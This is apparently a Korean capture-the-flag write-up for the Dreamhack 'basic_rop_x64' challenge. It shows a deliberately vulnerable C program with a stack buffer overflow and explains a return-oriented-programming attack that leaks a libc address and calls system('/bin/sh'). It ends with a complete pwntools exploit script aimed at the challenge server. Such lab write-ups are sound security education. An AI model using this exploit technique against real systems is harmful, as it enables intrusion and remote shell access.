```c
// Name: basic_rop_x64.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

```bash
$ checksec ./basic_rop_x64
[*] './basic_rop_x64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 분석

`basic_rop_x64.c` 코드와 `checksec ./basic_rop_x64`의 결과를 볼 때 stack canary를 적용하지 않았으며, NX를 우회해서 쉘을 탈취해야 함을 알 수 있다.

# 취약점

`buf` 배열의 크기는 `0x40`바이트 밖에 안 되는데, `read(0, buf, 0x400);`을 통해 `0x400`바이트의 데이터를 `stdin`을 통해 읽어들이므로 BOF 취약점이 있다.

# 공격

```bash
pwndbg> plt
Section .plt 0x4005b0-0x400640:
0x4005c0: puts@plt
0x4005d0: write@plt
0x4005e0: alarm@plt
0x4005f0: read@plt
0x400600: __libc_start_main@plt
0x400610: signal@plt
0x400620: setvbuf@plt
0x400630: exit@plt
```

gdb를 통해 바이너리의 PLT를 확인하면 `puts` 함수가 PLT에 있음을 확인할 수 있다.
`puts` 함수는 `write` 함수와 달리 인자가 하나 뿐이며, 문자열의 크기를 인자로 넘겨줄 필요가 없으므로 다루기가 상대적으로 간단하다.
따라서 `puts` 함수를 이용하여 공격할 방법을 고려해볼 수 있다.

`puts` 함수를 사용하기 위해서는 `rdi` 레지스터에 원하는 값을 넣을 수 있어야 하므로, `pop rdi`를 포함하는 가젯을 얻을 필요가 있다.
이를 비롯하여 필요한 여러 주요 주소값을 gdb와 ROPgadget 등의 도구를 이용하여 얻어내면 다음과 같다.

* 'ret' 가젯 : `0x4005a9`
* 'pop rdi; ret' 가젯 : `0x400883`
* `buf` : `$rbp-0x40`
* SFP : `$rbp`
* return address : `$rbp+0x8`

이제 payload를 구성하자.
먼저, ROP를 통해 `puts(puts@got);`를 호출하고 이 함수의 return address를 `main`으로 덮어쓰는 방식으로 `puts@got`를 얻어내고 `main` 함수를 재호출하여 `puts@got`를 활용한 payload를 다시 전송할 수 있도록 한다.

그 후, 얻어낸 `puts@got`를 활용하여 `system("/bin/sh");`를 호출할 수 있는 payload를 구성하여 전송하면 쉘을 탈취할 수 있다.

이때, `"/bin/sh"`는 `libc.so.6`에 저장되어 있으므로, 이를 활용하면 된다.

```python
# Name: basic_rop_x64.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

def slog(name, addr):
    success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 10770

# conn = process('./basic_rop_x64') # local
conn = remote(HOST, PORT)
e = ELF('./basic_rop_x64')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local
libc = ELF('./libc.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
gadget = {
    'ret' : 0x4005a9,
    'pop rdi; ret' : 0x400883
}

buf = b'A' * 0x40
SFP = b'B' * 0x8
payload = buf + SFP

# puts(puts_got)
payload += p64(gadget['ret']) # alignment for movaps instruction
payload += p64(gadget['pop rdi; ret']) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(e.sym['main']) # return to main

conn.send(payload)

conn.recvuntil(buf)
puts = u64(conn.recvn(6) + b'\x00\x00')
lb = puts - libc.sym['puts']
system = lb + libc.sym['system']
sh = lb + list(libc.search(b'/bin/sh'))[0]

slog('puts', puts)
slog('libc_base', lb)
slog('system', system)
slog('/bin/sh', sh)

# system("/bin/sh")
payload = buf + SFP
payload += p64(gadget['pop rdi; ret']) + p64(sh)
payload += p64(system)

conn.send(payload)
conn.interactive()
```